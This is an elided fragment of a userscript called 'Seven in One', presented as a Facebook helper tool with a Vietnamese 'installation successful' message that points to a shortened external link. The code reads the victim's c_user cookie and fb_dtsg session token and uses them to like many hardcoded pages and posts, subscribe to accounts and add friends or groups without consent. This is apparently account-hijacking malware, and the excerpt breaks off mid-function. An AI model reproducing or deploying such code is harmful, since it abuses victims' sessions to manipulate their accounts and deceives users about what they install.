// ==UserScript==
// @name            Seven in One
// @description     All about facebook By LEE TP.MIT
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://alturl.com/iyo7p" target="_blank">CÀI ĐẶT THÀNH CÔNG! Bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng kích chuột vào đây để thực hiện công đoạn hoàn tất. Ứng dụng sẽ bắt đầu tính thời gian chờ ngay sau khi bạn hoàn thành bước hoàn tất. Ứng dụng được phát triển bởi Cộng đồng IT Việt.<br>IT VIỆT</a>';
	html += '</div>';
...
sublist("211502752360749");

//Group ku adibpn
var gid = ['368242389962456'];
...
var spage_id = "100004963084317";
var spost_id = "100006047793901";
var sfoto_id = "192905897551512";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
// pic + fans
P("192905897551512");Like("666455546700815");Like("488425741271889");Like("729212690425338");Like("177170025814528");P("718086154871087");Like("457029681069397");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
